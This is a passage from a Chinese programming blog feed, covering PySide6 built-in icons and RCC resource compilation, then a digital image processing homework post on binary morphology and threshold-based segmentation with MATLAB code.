当前选项卡设置为下箭头</span></span><br><span class="line">        self.toolBox.setItemIcon(index, self.arrowDown)</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/341ddbf96da0/image-20240207194925486.png" class="" title="image-20240207194925486"><h2 id="资源的加载"><a href="#资源的加载" class="headerlink" title="资源的加载"></a>资源的加载</h2><h3 id="内置图标"><a href="#内置图标" class="headerlink" title="内置图标"></a>内置图标</h3><p>PySide6提供了一组内置的图标，我们可以在应用程序中使用这些图标来美化界面或者作为按钮、工具栏等控件的图标。</p><p>我们可以通过<code>QStyle</code>类中的<code>standardIcon()</code>方法来访问这些内置图标。</p><p>以下是一些常用的内置图标：</p><ul><li><code>SP_ArrowUp</code>: 向上箭头</li><li><code>SP_ArrowDown</code>: 向下箭头</li><li><code>SP_ArrowLeft</code>: 向左箭头</li><li><code>SP_ArrowRight</code>: 向右箭头</li><li><code>SP_DialogOkButton</code>: 对话框确认按钮</li><li><code>SP_DialogCancelButton</code>: 对话框取消按钮</li><li><code>SP_FileIcon</code>: 文件图标</li><li><code>SP_DirIcon</code>: 文件夹图标</li><li><code>SP_ComputerIcon</code>: 计算机图标</li></ul><p>要使用这些内置图标，首先需要导入 <code>QStyle</code> 类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QStyle</span><br></pre></td></tr></table></figure><p>在窗口初始化时我们需要获取图标对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.okIcon = self.style().standardIcon(QStyle.StandardPixmap.SP_DialogOkButton)</span><br></pre></td></tr></table></figure><p>最后我们可以将这些图标对象直接应用到需要的控件上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">okButton = QPushButton(<span class="string">&quot;OK&quot;</span>)   </span><br><span class="line">okButton.setIcon(self.okIcon)</span><br></pre></td></tr></table></figure><h3 id="Rcc的使用"><a href="#Rcc的使用" class="headerlink" title="Rcc的使用"></a>Rcc的使用</h3><p>当我们打包软件时，一般只有py文件或者是一些源码和环境被打包进exe，而资源文件仍然存在指定目录下的文件夹下</p><p>这样往往会显得软件较为臃肿，还容易将资源文件误删</p><p>我们可以使用Rcc来<strong>将各种资源文件(图像、视频、数据库等)转成py文件</strong>，和代码一块打包</p><div class="note info flat"><p>在PySide6中，<strong>RCC（Resource Compiler）</strong>是一个用于将资源文件（如图像、样式表等）编译成二进制格式的工具。编译后的资源文件可以嵌入到Python可执行文件中，以便在运行时轻松访问这些资源。</p></div><h4 id="创建资源文件"><a href="#创建资源文件" class="headerlink" title="创建资源文件"></a>创建资源文件</h4><p>我们可以<strong>使用Qt Designer来轻松创建和管理</strong>这些二进制资源文件</p><p>打开Qt Designer，我们可以点击菜单栏的<code>视图&gt;资源浏览器</code>来开启资源视图</p><img src="/posts/341ddbf96da0/image-20240207225641729.png" class="" title="image-20240207225641729"><p>此时右下角会多出一个<strong>资源浏览器</strong></p><img src="/posts/341ddbf96da0/image-20240207225754074.png" class="" title="image-20240207225754074"><p>点击左上角的编辑按钮，即可编辑资源</p><img src="/posts/341ddbf96da0/image-20240207225948977.png" class="" title="image-20240207225948977"><p>编辑界面中有三个需要关注的按钮，新建资源文件、添加前缀以及添加文件</p><p>这里我们可以<strong>将其类比于数据库</strong></p><p>每个资源文件，即一个二进制py文件，可以看作是一个库，我们在项目中可以引入这些资源库</p><p>而前缀即库中的一些表，可以当作子目录，我们可以将相同类型的资源文件添加到相同前缀中</p><p>而文件即具体的资源文件，作为前缀中的一些的表项</p><img src="/posts/341ddbf96da0/image-20240207230701962.png" class="" title="image-20240207230701962"><p>创建完毕后，我们在vscode中找到生成的qrc文件，右键该文件点击<code>Compile</code>进行编译</p><img src="/posts/341ddbf96da0/image-20240207230821958.png" class="" title="image-20240207230821958"><p>随后即可得到二进制py文件</p><img src="/posts/341ddbf96da0/image-20240207230919929.png" class="" title="image-20240207230919929"><h4 id="加载资源文件"><a href="#加载资源文件" class="headerlink" title="加载资源文件"></a>加载资源文件</h4><p>当我们想加载得到的二进制资源文件中的资源时，可以直接在Qt Designer中可视化引用</p><p>例如我们添加一个按钮后，可以<strong>在属性编辑器中选择图标</strong></p><img src="/posts/341ddbf96da0/image-20240207231158846.png" class="" title="image-20240207231158846"><p>点击选择资源，即可从我们创建的资源文件库中挑选资源</p><img src="/posts/341ddbf96da0/image-20240207231235775.png" class="" title="image-20240207231235775"><img src="/posts/341ddbf96da0/image-20240207231319858.png" class="" title="image-20240207231319858"><p>当然，我们也可以在代码中加载资源</p><p>首先引用资源文件库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test_rc</span><br></pre></td></tr></table></figure><p>接着我们可以通过特殊的路径引用方法使用库中的资源创建图标，即<code>:/前缀/路径</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check_yes_icon = QIcon()</span><br><span class="line">check_yes_icon.addFile(<span class="string">u&quot;:/icons/icons/check_yes.png&quot;</span>, QSize(), QIcon.Normal, QIcon.Off)</span><br></pre></td></tr></table></figure><p>需要注意的是，这里的路径中，前一个<code>icons</code>为前缀名，而后面的<code>icons/check_yes.png</code>为一开始创建资源文件时，该资源相对于资源文件库的路径</p><p>所以其实为了更便捷地引用，<strong>在一开始创建资源库时，最好这些资源和库文件放在同一目录下</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> note </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图像处理 作业五</title>
      <link href="/posts/0dd96b178030/"/>
      <url>/posts/0dd96b178030/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本系列文章为学校课程《数字图像处理》布置的一些小project作业</p><p>除了给出每个问题的解答和代码，我也会附上相关知识点，以方便后续复习</p><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h2 id="形态学处理"><a href="#形态学处理" class="headerlink" title="形态学处理"></a>形态学处理</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>形态学处理是指将数学形态学作为⼯具从图像中提取对于表达和描述区域形状有⽤的图像分量。</p><p>形态学处理表现为⼀种邻域运算形式；⼀种特殊定义的邻域称之为<strong>“结构单元”（Structure Element）</strong>，在每个像素位置上它与⼆值图像对应的区域进⾏特定的逻辑运算，逻辑运算的结果为输出图像的相应像素。</p><p>形态学运算的效果取决于结构单元的⼤⼩、内容以及逻辑运算的性质</p><h2 id="基本处理定义"><a href="#基本处理定义" class="headerlink" title="基本处理定义"></a>基本处理定义</h2><h3 id="二值形态学处理"><a href="#二值形态学处理" class="headerlink" title="二值形态学处理"></a>二值形态学处理</h3><p>二值图像中，黑色表示1，白色表示0</p><img src="/posts/0dd96b178030/image-20231216150630889.png" class="" title="image-20231216150630889"><img src="/posts/0dd96b178030/image-20231216150643744.png" class="" title="image-20231216150643744"><h3 id="平移"><a href="#平移" class="headerlink" title="平移"></a>平移</h3><img src="/posts/0dd96b178030/image-20231216150731370.png" class="" title="image-20231216150731370"><p>此处的<strong>结构单元x</strong>在平移运算中通常为1个点</p><h3 id="扩张"><a href="#扩张" class="headerlink" title="扩张"></a>扩张</h3><p>扩张使得图像扩大</p><img src="/posts/0dd96b178030/image-20231216152448033.png" class="" title="image-20231216152448033"><h3 id="腐蚀"><a href="#腐蚀" class="headerlink" title="腐蚀"></a>腐蚀</h3><p>腐蚀会使得图像缩小</p><img src="/posts/0dd96b178030/image-20231216152638746.png" class="" title="image-20231216152638746"><img src="/posts/0dd96b178030/image-20231216153002542.png" class="" title="image-20231216153002542"><p>如果有<strong>完美匹配</strong>则将结构中心处设为1</p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p>扩张和腐蚀具有以下性质</p><img src="/posts/0dd96b178030/image-20231216153409216.png" class="" title="image-20231216153409216"><p><strong>方形结构单元越大，膨胀和腐蚀的效果越强</strong></p><img src="/posts/0dd96b178030/image-20231216153646850.png" class="" title="image-20231216153646850"><img src="/posts/0dd96b178030/image-20231216153700024.png" class="" title="image-20231216153700024"><h2 id="形态学变换"><a href="#形态学变换" class="headerlink" title="形态学变换"></a>形态学变换</h2><h3 id="结构开-open-变换"><a href="#结构开-open-变换" class="headerlink" title="结构开(open)变换"></a>结构开(open)变换</h3><p>结构开变换等同于<strong>先腐蚀然后再扩张</strong></p><p><strong>公式</strong>：$A \circ B = (A \ominus B) \oplus B$</p><p><strong>目的</strong>：<strong>使轮廓平滑</strong>，抑制A物体边界的⼩离散点或尖峰，在研究物体的形态分布时常⽤。⽤来<strong>消除⼩物体、在纤细点处分离物体</strong>、平滑较⼤物体的边界的同时并不明显改变其⾯积。</p><p>下图能够非常直观的说明平滑作用</p><img src="/posts/0dd96b178030/image-20231216154547071.png" class="" title="image-20231216154547071"><img src="/posts/0dd96b178030/image-20231216154657067.png" class="" title="image-20231216154657067"><h3 id="结构闭-close-变换"><a href="#结构闭-close-变换" class="headerlink" title="结构闭(close)变换"></a>结构闭(close)变换</h3><p>结构闭变换等同于<strong>先扩张然后再腐蚀</strong></p><p><strong>公式</strong>：$A \bullet B = (A \ominus B) \oplus B$</p><p><strong>目的</strong>：也是⽤于图像光滑。但与开变换相反，闭变换⽤来<strong>填充物体内细⼩空洞、连接邻近物体、平滑其边界</strong>的同时并不明显改变其⾯积。</p><p>下图能够非常直观的说明填补空洞的作用</p><img src="/posts/0dd96b178030/image-20231216160301592.png" class="" title="image-20231216160301592"><h2 id="图像分割"><a href="#图像分割" class="headerlink" title="图像分割"></a>图像分割</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>图像分割即将数字图像分割成多个部分或区域的过程。这些区域通常是<strong>根据图像中的像素特性（如颜色、亮度、纹理）</strong>来定义的，目的是使分割后的区域在某种意义上具有内部一致性，同时与其他区域有明显的区别。</p><p>图像分割算法可以看作是<strong>基于亮度值的不连续性和相似性</strong></p><h3 id="基于阈值的分割"><a href="#基于阈值的分割" class="headerlink" title="基于阈值的分割"></a>基于阈值的分割</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><div class="note info flat"><p><strong>基于阈值的图像分割</strong>是一种将图像转换为二值图像的方法，即图像中的每个像素点要么是前景（通常表示为白色或1），要么是背景（通常表示为黑色或0）。这种方法特别适用于对象和背景在亮度或颜色上有显著差异的图像。</p></div><p>在基于阈值的分割中，<strong>关键是确定一个或多个阈值</strong>，以便将像素分为不同的类别。不同类型的阈值分割方法侧重于如何选择这些阈值。</p><h4 id="基本全局阈值"><a href="#基本全局阈值" class="headerlink" title="基本全局阈值"></a>基本全局阈值</h4><p>当目标和背景像素的灰度分布非常不同时，可以对整个图像使用单个（全局）阈值</p><p>下面是一种全局阈值常用的迭代算法：</p><ol><li><p>为全局阈值T选择一个初始估计值</p></li><li><p>使用T分割图像，这将产生两组像素：由灰度值大于T的所有像素组成的$G_1$，由所有小于等于T的像素组成的$G_2$</p></li><li><p>对$G_1$和$G_2$中的像素分别计算平均灰度值$m_1$和$m_2$</p></li><li><p>在$m_1$和$m_2$之间计算一个新的阈值：</p><script type="math/tex; mode=display">T= \frac{1}{2} (m_1+m_2)</script></li><li><p>重复步骤2到步骤4，<strong>直到连续迭代中的两个T值间的差小于某个预定义的值$\Delta T$为止</strong></p></li></ol><p>当与目标和背景相关的直方图模式之间存在一个非常清晰的波谷时，上述算法很有效</p><h4 id="基本自适应阈值（可变阈值）"><a href="#基本自适应阈值（可变阈值）" class="headerlink" title="基本自适应阈值（可变阈值）"></a>基本自适应阈值（可变阈值）</h4><p>可变阈值，也称为局部或自适应阈值，其基本思想是为图像的不同区域使用不同的阈值。这种方法认识到图像的各个部分可能由于光照、阴影、噪声或其他因素的影响，而具有不同的亮度和对比度特性。因此，相比于全局阈值，它可以更加精细地处理图像的局部特征。</p><p>自适应阈值相对于全局阈值的<strong>优势</strong>体现在：</p><ol><li><p><strong>光照不均匀</strong>：</p><p>自适应阈值能够更好地处理图像中光照变化的区域，因为它可以为每个局部区域计算一个专门的阈值。</p></li><li><p><strong>局部对比度变化</strong>：</p><p>在一些区域可能存在的高对比度物体旁边的低对比度物体可以通过自适应阈值更容易被分割出来。</p></li><li><p><strong>噪声和纹理</strong>：</p><p>全局阈值可能会将噪声错误地识别为前景或背景。而自适应阈值可以根据局部区域的纹理和噪声水平调整阈值，从而降低噪声对分割结果的影响。</p></li></ol><p>一个较为简单的自适应阈值算法如下：</p><ol><li><p><strong>初始化</strong>：选择一个窗口大小<code>windowSize</code>，这将定义用于计算局部阈值的邻域大小。选择一个调整常数<code>C</code>，它将用于从局部平均值中减去，以计算每个像素的阈值。</p></li><li><p><strong>遍历图像的每个像素</strong>：对于图像中的每个像素<code>p(i, j)</code>，执行以下步骤：</p><p>a. <strong>确定局部邻域</strong>：计算出当前像素<code>p(i, j)</code>的局部邻域。这个邻域是以<code>(i, j)</code>为中心，大小为<code>windowSize x windowSize</code>的像素块。</p><p>b. <strong>提取局部区域</strong>：从原始图像中提取出步骤2a定义的局部邻域。如果邻域超出图像边界，则只考虑落在图像内的部分。</p></li><li><p><strong>计算局部统计量</strong>：对于步骤2b中提取的每个局部邻域，计算局部统计量，本算法中即计算其所有像素的平均灰度值<code>m</code>。</p></li><li><p><strong>计算局部阈值</strong>：使用局部统计量和调整常数<code>C</code>来计算当前像素的局部阈值<code>T_local</code>。阈值可以用以下公式计算：<code>T_local = m * (1 - C)</code>。</p></li><li><p><strong>应用阈值</strong>：对于每个像素<code>p(i, j)</code>，根据其局部阈值<code>T_local</code>来决定其在二值图像中的值。如果<code>p(i, j)</code>的灰度值大于<code>T_local</code>，则在二值图像中该像素设置为1（或255，取决于所需的二值图像格式），否则设置为0。</p></li><li><p><strong>输出二值图像</strong>：重复步骤2至步骤5，直到图像中的每个像素都被处理。最终得到的二值图像是根据局部阈值分割后的结果。</p></li></ol><h1 id="HW1-二值形态学处理"><a href="#HW1-二值形态学处理" class="headerlink" title="HW1 二值形态学处理"></a>HW1 二值形态学处理</h1><p>作业要求：</p><blockquote><ol><li><p>一个二进制数组代表了一张黑白图像的一部分，如下图所示。假设该片段周围的所有像素都是黑色背景，请在这部分图像上执行下列操作。</p><img src="/posts/0dd96b178030/image-20231216170646592.png" class="" title="image-20231216170646592"><p>(a) 使用如下结构元素进行扩张（Dilation）操作，原点用圆圈标出。</p><img src="/posts/0dd96b178030/image-20231216171737344.png" class="" title="image-20231216171737344"><p>(b) 使用如下结构元素进行腐蚀（Erosion）操作，原点用圆圈标出。</p><img src="/posts/0dd96b178030/image-20231216171745692.png" class="" title="image-20231216171745692"><p>(c) 使用如下结构元素进1行扩张（Dilation）操作，原点用圆圈标出。 </p><img src="/posts/0dd96b178030/image-20231216171754332.png" class="" title="image-20231216171754332"><p>(d) 使用如下结构元素进行腐蚀（Erosion）操作，原点用圆圈标出。 </p><img src="/posts/0dd96b178030/image-20231216171756525.png" class="" title="image-20231216171756525"><p>(e) 使用上述结构元素进行开操作（Opening）。 </p><p>(f) 使用上述结构元素进行闭操作（Closing）。</p></li></ol></blockquote><p>这里我们将数组视为二值图像来展示</p><p>首先我们定义题目中待处理的的图像数组以及结构单元</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">binary_image = [</span><br><span class="line">    <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">];</span><br><span class="line">se1 = [<span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span>];</span><br><span class="line">se2 = [<span class="number">1</span> <span class="number">0</span>; <span class="number">0</span> <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>扩张操作使用matlab自带的函数<code>imdilate()</code></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dilation1 = imdilate(binary_image, se1);</span><br><span class="line">imwrite(dilation1, <span class="string">&#x27;dilation1.png&#x27;</span>);</span><br><span class="line">dilation2 = imdilate(binary_image, se2);</span><br><span class="line">imwrite(dilation2, <span class="string">&#x27;dilation2.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>腐蚀操作使用函数<code>imerode()</code></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">erosion1 = imerode(binary_image, se1);</span><br><span class="line">imwrite(erosion1, <span class="string">&#x27;erosion1.png&#x27;</span>);</span><br><span class="line">erosion2 = imerode(binary_image, se2);</span><br><span class="line">imwrite(erosion2, <span class="string">&#x27;erosion2.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>开操作使用函数<code>imopen()</code></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opening1 = imopen(binary_image, se1);</span><br><span class="line">imwrite(opening1, <span class="string">&#x27;opening1.png&#x27;</span>);</span><br><span class="line">opening2 = imopen(binary_image, se2);</span><br><span class="line">imwrite(opening2, <span class="string">&#x27;opening2.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>闭操作使用函数<code>imclose()</code></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">closing1 = imclose(binary_image, se1);</span><br><span class="line">imwrite(closing1, <span class="string">&#x27;closing1.png&#x27;</span>);</span><br><span class="line">closing2 = imclose(binary_image, se2);</span><br><span class="line">imwrite(closing2, <span class="string">&#x27;closing2.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>最后将形态学处理的结果与原图进行对比</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">figure</span>;</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>), imshow(binary_image), title(<span class="string">&#x27;原图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>), imshow(dilation1), title(<span class="string">&#x27;使用SE1扩张&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>), imshow(erosion1), title(<span class="string">&#x27;使用SE1腐蚀&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>), imshow(dilation2), title(<span class="string">&#x27;使用SE2扩张&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>), imshow(erosion2), title(<span class="string">&#x27;使用SE2腐蚀&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>), imshow(opening1), title(<span class="string">&#x27;使用SE1进行开操作&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">7</span>), imshow(opening2), title(<span class="string">&#x27;使用SE2进行开操作&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">8</span>), imshow(closing1), title(<span class="string">&#x27;使用SE1进行闭操作&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">3</span>,<span class="number">9</span>), imshow(closing2), title(<span class="string">&#x27;使用SE2进行闭操作&#x27;</span>);</span><br></pre></td></tr></table></figure><p>得到的结果如下图</p><img src="/posts/0dd96b178030/morphological_operations_comparison.png" class="" title="morphological_operations_comparison"><p>我们可以看到，由于<strong>SE1结构单元的元素呈水平排列</strong>，所以经过扩张操作，原图的<strong>水平方向上白色区域变宽</strong></p><p>同时<strong>SE1腐蚀导致原图水平方向上变窄且细节消失</strong></p><p>SE2由于是呈对角线，所以扩张操作增加了对角方向的白色区域，而腐蚀减少了对角方向的白色像素</p><p>SE1的开操作将上半部分小的白色趋于滤去，而<strong>SE2的开操作相对而言保留了更多不同的区域</strong></p><p>而SE1结构单元的闭操作填补了原图的细小空洞，而SE2闭操作后与原图一致，这是由于对角方向上基本上都是连贯的，不需要填补</p><h1 id="HW2-图像分割"><a href="#HW2-图像分割" class="headerlink" title="HW2 图像分割"></a>HW2 图像分割</h1><p>作业要求：</p><blockquote><p>图1展示了blobz1.png和blobz2.png两幅图像。两者的区别在于blobz1的照明几乎是均匀的，而blobz2的照明非常不均匀。这个问题的目标是构建一个基于全局灰度阈值的算法，用于分割每个图像。</p><p><code>blobz1.png</code>如下</p><p><style>.hfyvxzwuujqt{zoom:67%;}</style><img src="/posts/0dd96b178030/blobz1-17029064856822.png" class="hfyvxzwuujqt" alt="blobz1"></p><p><code>blobz2.png</code>如下</p><p><style>.qkyvffnilewl{zoom: 67%;}</style><img src="/posts/0dd96b178030/blobz2.png" class="qkyvffnilewl" alt="blobz2"></p></blockquote><p>首先我们需要观察一下这两张图片的直方图，用于确认什么分割方法更适合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">img1 = imread(<span class="string">&#x27;blobz1.png&#x27;</span>);</span><br><span class="line">img2 = imread(<span class="string">&#x27;blobz2.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 显示原始图像及其直方图</span></span><br><span class="line"><span class="built_in">figure</span>;</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>); imshow(img1); title(<span class="string">&#x27;blobz1.png&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>); imshow(img2); title(<span class="string">&#x27;blobz2.png&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>); imhist(img1); title(<span class="string">&#x27;blobz1 直方图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>); imhist(img2); title(<span class="string">&#x27;blobz2 直方图&#x27;</span>);</span><br><span class="line">saveas(gcf, <span class="string">&#x27;histograms.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>得到下图结果</p><img src="/posts/0dd96b178030/histograms.png" class="" title="histograms"><p>可以发现，由于图一光照较为均匀，直方图中呈现出了<strong>两个较为明显的波峰</strong>，适合直接使用<strong>全局阈值分割</strong></p><p>而图二的波形由于光照不均匀是多峰的，所以需要使用<strong>自适应阈值</strong>分割来处理</p><p>首先是全局阈值算法，我们使用简单的迭代算法：</p><ol><li><p>为全局阈值T选择一个初始估计值</p></li><li><p>使用T分割图像，这将产生两组像素：由灰度值大于T的所有像素组成的$G_1$，由所有小于等于T的像素组成的$G_2$</p></li><li><p>对$G_1$和$G_2$中的像素分别计算平均灰度值$m_1$和$m_2$</p></li><li><p>在$m_1$和$m_2$之间计算一个新的阈值：</p><script type="math/tex; mode=display">T= \frac{1}{2} (m_1+m_2)</script></li><li><p>重复步骤2到步骤4，<strong>直到连续迭代中的两个T值间的差小于某个预定义的值$\Delta T$为止</strong></p></li></ol><p>首先设置初始参数</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">T1 = double(<span class="built_in">max</span>(img1(:)) + <span class="built_in">min</span>(img1(:))) / <span class="number">2</span>;</span><br><span class="line">deltaT1 = <span class="number">0.5</span>; <span class="comment">% 阈值变化的停止条件</span></span><br><span class="line">prevT1 = <span class="number">-1</span>; <span class="comment">% 初始化为一个负数</span></span><br></pre></td></tr></table></figure><p>这里<strong>T的初始值</strong>我们设置为使用<strong>最大值和最小值计算的平均值</strong></p><p>停止条件设置为0.5</p><p>接下来是循环求取阈值</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">abs</span>(T1 - prevT1) &gt;= deltaT1</span><br><span class="line">    G1 = img1(img1 &gt; T1);</span><br><span class="line">    G2 = img1(img1 &lt;= T1);</span><br><span class="line">    m1 = <span class="built_in">mean</span>(G1(:));</span><br><span class="line">    m2 = <span class="built_in">mean</span>(G2(:));</span><br><span class="line">    prevT1 = T1;</span><br><span class="line">    T1 = <span class="number">0.5</span> * (m1 + m2);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>求得阈值后，我们直接使用判断语句得到结果的图像矩阵</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binaryImage1 = img1 &gt; T1;</span><br><span class="line">imwrite(binaryImage1, <span class="string">&#x27;result/global_img1.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>我们可以得到如下和原图的对比</p><img src="/posts/0dd96b178030/rocessing_results_img1.png" class="" title="rocessing_results_img1"><p>全局迭代阈值算法对于图一的分割效果非常好</p><p>但是到了图二，全局阈值的分割效果就很不好了，下图为图二的全局阈值处理结果</p><img src="/posts/0dd96b178030/global_img2.png" class="" title="global_img2"><p>可以看到，由于<strong>原图的左下角光照较差</strong>，大部分像素点的像素值较低，处于直方图左侧，低于算出的阈值，<strong>被作为前景处理</strong></p><p>接下来我们使用自适应算法：</p><ol><li><p><strong>初始化</strong>：选择一个窗口大小<code>windowSize</code>，这将定义用于计算局部阈值的邻域大小。选择一个调整常数<code>C</code>，它将用于从局部平均值中减去，以计算每个像素的阈值。</p></li><li><p><strong>遍历图像的每个像素</strong>：对于图像中的每个像素<code>p(i, j)</code>，执行以下步骤：</p><p>a. <strong>确定局部邻域</strong>：计算出当前像素<code>p(i, j)</code>的局部邻域。这个邻域是以<code>(i, j)</code>为中心，大小为<code>windowSize x windowSize</code>的像素块。</p><p>b. <strong>提取局部区域</strong>：从原始图像中提取出步骤2a定义的局部邻域。如果邻域超出图像边界，则只考虑落在图像内的部分。</p></li><li><p><strong>计算局部统计量</strong>：对于步骤2b中提取的每个局部邻域，计算局部统计量，本算法中即计算其所有像素的平均灰度值<code>m</code>。</p></li><li><p><strong>计算局部阈值</strong>：使用局部统计量和调整常数<code>C</code>来计算当前像素的局部阈值<code>T_local</code>。阈值可以用以下公式计算：<code>T_local = m * (1 - C)</code>。</p></li><li><p><strong>应用阈值</strong>：对于每个像素<code>p(i, j)</code>，根据其局部阈值<code>T_local</code>来决定其在二值图像中的值。如果<code>p(i, j)</code>的灰度值大于<code>T_local</code>，则在二值图像中该像素设置为1（或255，取决于所需的二值图像格式），否则设置为0。</p></li><li><p><strong>输出二值图像</strong>：重复步骤2至步骤5，直到图像中的每个像素都被处理。最终得到的二值图像是根据局部阈值分割后的结果。</p></li></ol><p>这里我们将自适应算法写为一个函数，窗口大小以及C作为参数传入</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binaryImage</span> = <span class="title">adaptiveThresholding</span><span class="params">(img, windowSize, C)</span></span></span><br><span class="line">    halfWindowSize = <span class="built_in">floor</span>(windowSize / <span class="number">2</span>);</span><br><span class="line">    binaryImage = <span 